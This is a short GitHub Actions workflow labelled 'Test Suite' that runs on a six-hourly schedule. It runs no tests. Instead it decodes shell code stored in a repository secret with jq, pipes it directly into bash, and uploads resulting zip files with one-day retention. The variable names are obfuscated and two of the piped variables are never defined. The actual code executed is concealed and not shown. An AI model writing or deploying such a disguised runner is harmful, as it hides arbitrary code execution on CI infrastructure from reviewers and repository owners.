name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '33 4,10,16,22 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run
        env:
          cjyng93: ${{ secrets.cjyng93 }}
        run: |
          printf '%s' "$cjyng93" | jq -r .yfxbv3 | /bin/bash
          printf '%s' "$ok02" | jq -r .u66 | /bin/bash
          printf '%s' "$vm19" | jq -r .phkml44 | /bin/bash

      - name: Save archive
        uses: actions/upload-artifact@v4
        with:
          name: Bsn1Anv5
          path: "*.zip"
          retention-days: 1
